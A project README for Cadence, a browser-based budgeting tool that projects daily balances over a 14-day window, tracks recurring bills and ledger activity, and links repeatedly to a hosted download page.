# Cadence - Budgeting and Financial Planning 2026

> **Cadence is a browser-based budgeting application for daily earners that projects cash flow, organizes bill timing, and calculates balances one day at a time to support better financial decisions.**

[![Platform](https://img.shields.io/badge/Platform-Web-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-Current-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/chrisgrayhda727/cadence-bill-planner?style=flat-square)](https://github.com/chrisgrayhda727/cadence-bill-planner)

---

<p align="center">
  <a href="https://chrisgrayhda727.github.io/cadence-bill-planner/">
    <img src="https://img.shields.io/badge/Download-Cadence%20Latest-brightgreen?style=for-the-badge" alt="Download Cadence">
  </a>
</p>

> **[Download Cadence](https://chrisgrayhda727.github.io/cadence-bill-planner/)**

---

[Download Latest Build](https://chrisgrayhda727.github.io/cadence-bill-planner/)

---

## What Cadence Does

Cadence helps people manage finances when income and spending depend on particular dates instead of fitting neatly into a monthly summary. The application brings together expected payments, repeating obligations, and ledger activity to estimate how available funds could shift during the coming 14 days.

Use the day-by-day simulation to identify periods of financial pressure, evaluate possible interventions, and consider whether an advance might be necessary. Ledger and receipt inputs can also organize activity involving cash, e-transfer, debit, prepaid, payroll card, and direct-deposit transactions.

---

## Core Capabilities

- Highlights possible cash-flow conflicts over a 14-day forecast window.
- Projects when payments may arrive and how much income they may provide.
- Tracks repeating bills, financial obligations, and their due dates.
- Calculates a deterministic balance for every day in the forecast.
- Weighs intervention costs against other available options.
- Supports ledger records for cash, e-transfer, debit, prepaid, payroll card, and direct deposit activity.
- Extracts information from receipts and pay stubs to reduce manual entry.
- Generates risk scores associated with a possible need for an advance.
- Saves outputs from offline-trained models as JSON.

---

## Getting Started

### Open the hosted version

Launch the [latest Cadence build](https://chrisgrayhda727.github.io/cadence-bill-planner/) using a modern web browser.

### Clone and serve locally

```bash
git clone https://github.com/chrisgrayhda727/cadence-bill-planner.git
cd REPO
```

After cloning, serve the repository through any static web server and visit the local URL it provides. Cadence's frontend consists of web files and does not need a separate runtime installation.

---

## How to Use Cadence

1. Start Cadence in your web browser.
2. Provide expected income amounts and projected payment dates.
3. Enter recurring bills or other obligations along with their amounts and deadlines.
4. Add applicable ledger records, receipt data, or pay-stub details.
5. Examine the balance projection for each day in the 14-day window.
6. Review projected cash-flow conflicts and their related risk scores.
7. Assess possible interventions against the alternatives before deciding.
8. Export model output to JSON if you need an offline copy.

---

## Input and Configuration

There is no required command-line configuration file. Cadence is set up through the budgeting and ledger information entered in the application.

Common input categories include:

- Anticipated payment amounts and dates
- Repeating obligations and due dates
- Ledger records organized by payment method
- Receipt and pay-stub information
- Forecast and intervention details

Update the entries whenever bill schedules or payment timing changes. Current inputs help keep the daily projection aligned with the latest information.

---

## Requirements

- A modern web browser
- Either access to the Cadence hosted build or a local repository checkout
- Enough browser storage for budgeting information and exported results
- Relevant financial records, including payment details, recurring obligations, receipts, or pay stubs where applicable

Cadence runs as a web application, and its static frontend files do not require a server-side runtime.

---

## Frequently Asked Questions

### What kind of user is Cadence designed for?

Cadence is built for daily earners and for anyone planning around variable income dates, recurring expenses, and near-term cash-flow changes.

### What is the forecast range?

Cadence evaluates potential collisions across 14 days and shows a deterministic balance calculation for each day in that period.

### Which payment methods can be included in the ledger?

Ledger entries may represent cash, e-transfer, debit, prepaid, payroll card, or direct deposit activity.

### Does the application support receipts and pay stubs?

Yes. Receipt and pay-stub information can be parsed and added to the financial planning workflow.

### How can I troubleshoot an unexpected projection?

Check the entered payment amounts and dates, verify the due dates for recurring obligations, and make sure the ledger records reflect the scenario you intend to model.

### Is JSON export available?

Offline-trained model outputs can be exported as JSON for storage outside the application or for later analysis.

### How do I access the newest version?

Open the [latest available build](https://chrisgrayhda727.github.io/cadence-bill-planner/) to use the current published Cadence release.

### Where should I report issues or ask project questions?

Visit the repository's [GitHub page](https://github.com/chrisgrayhda727/cadence-bill-planner) for project support, questions, and issue reports.

---

## License

Cadence is distributed under the GNU GPL v3.0. See [LICENSE](LICENSE) for the full license details.
